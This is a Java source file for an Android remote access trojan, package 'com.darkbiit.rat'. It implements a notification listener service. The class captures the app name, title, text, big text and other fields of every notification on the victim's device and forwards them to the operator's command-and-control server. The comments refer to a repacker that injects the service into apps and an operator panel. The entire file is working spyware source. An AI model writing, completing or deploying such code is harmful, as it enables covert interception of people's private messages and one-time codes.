package com.darkbiit.rat;

import android.app.Notification;
import android.content.Intent;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Forwards incoming notifications to the C2.
 *
 * The service must be enabled by the user (or by the operator through
 * "Notification access" in the system settings); the repacker adds the
 * manifest entry and the panel can open the right settings screen.
 *
 * Only the fields that matter for interception are forwarded: app, title,
 * text, subtext, big text, and the notification id.
 */
public class RatNotificationListener extends NotificationListenerService {

    /** Broadcast action used to hand a notification to the service process. */
    public static final String ACTION_NOTIFICATION = "com.darkbiit.rat.NOTIFICATION";

    /** Set when the listener and the service happen to share a process. */
    public static volatile RatEventSink sink = null;

    /** Hands the event to the service, directly or over a broadcast. */
    private void deliver(Map<String, Object> event) {
        RatEventSink s = sink;
        if (s != null) {
            s.onEvent("notification", event);
            return;
        }
        try {
            Intent i = new Intent(ACTION_NOTIFICATION);
            i.setPackage(getPackageName());
            i.putExtra("payload", RatJson.encode(event));
            sendBroadcast(i);
        } catch (Throwable t) {
            RatLog.w("notification broadcast failed: " + t.getMessage());
        }
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        RatLog.i("notification listener connected");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Map<String, Object> m = new LinkedHashMap<String, Object>();
            m.put("event", "notification");
            m.put("package", sbn.getPackageName());
            m.put("id", sbn.getId());
            m.put("key", sbn.getKey());
            m.put("post_time", sbn.getPostTime());
            m.put("ongoing", sbn.isOngoing());
            m.put("clearable", sbn.isClearable());

            Notification n = sbn.getNotification();
            if (n != null) {
                if (n.extras != null) {
                    Bundle ex = n.extras;
                    m.put("title", ex.getCharSequence(Notification.EXTRA_TITLE));
                    m.put("text", ex.getCharSequence(Notification.EXTRA_TEXT));
                    m.put("subtext", ex.getCharSequence(Notification.EXTRA_SUB_TEXT));
                    m.put("big_text", ex.getCharSequence(Notification.EXTRA_BIG_TEXT));
                    m.put("info_text", ex.getCharSequence(Notification.EXTRA_INFO_TEXT));
                    m.put("summary", ex.getCharSequence(Notification.EXTRA_SUMMARY_TEXT));
                }
                m.put("category", n.category);
                m.put("channel_id", getChannelId(n));
            }

            deliver(m);
        } catch (Throwable t) {
            RatLog.w("notification forward failed: " + t.getMessage());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        try {
            Map<String, Object> m = new LinkedHashMap<String, Object>();
            m.put("event", "notification_removed");
            m.put("package", sbn.getPackageName());
            m.put("id", sbn.getId());
            deliver(m);
        } catch (Throwable ignored) {
            // nothing to do
        }
    }

    /** Channel id across API levels (26+ only). */
    private static String getChannelId(Notification n) {
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                return n.getChannelId();
            }
        } catch (Throwable ignored) {
            // fall through
        }
        return null;
    }
}
